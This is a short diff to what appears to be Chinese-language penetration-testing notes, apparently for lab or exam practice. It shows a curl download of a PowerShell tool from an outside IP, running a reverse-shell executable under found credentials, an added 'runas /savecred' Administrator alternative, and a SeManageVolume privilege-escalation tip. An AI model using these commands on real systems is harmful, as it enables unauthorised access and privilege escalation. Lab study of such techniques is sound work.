@@ -676,6 +676,8 @@ curl http://192.168.45.233:85/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1
 . .\Invoke-RunasCs.ps1
 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\Users\Public\shell.exe"
 # 先启动，在反弹，这里账号密码是你找到的，反弹脚本位置自己找好，监听端口，反弹shell
+# 或者直接runas /savecred /user:Administrator "shell4444.exe"
+# 后续会弹出窗口输入密码
 ```
 
 30. `whoami /priv`如果显示`SeManageVolumePrivilege`,可以使用SeManageVolumeExploit.exe文件提权。上传后使用即可。
